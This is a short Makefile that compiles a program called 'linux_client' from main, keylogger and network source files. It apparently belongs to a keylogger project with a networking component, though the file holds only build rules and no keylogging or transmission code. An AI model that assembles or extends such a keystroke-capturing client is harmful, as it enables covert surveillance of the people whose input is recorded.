CC=gcc
CFLGAS=-Wall -O -g
LDFLAGS=
EXEC=../linux_client
SRC=$(wildcard *.c)
OBJ=$(SRC:%.c=%.o)

all: $(EXEC)

$(EXEC): $(OBJ)
	$(CC) -o $@ $^ $(LDFLAGS)

%.o: %.c
	$(CC) -o $@ -c $< $(CFLGAS)

main.o: keylogger.h 

keylogger.o: key.h keylogger.h network.h

network.o: network.h 


clean:
	@rm -f *.o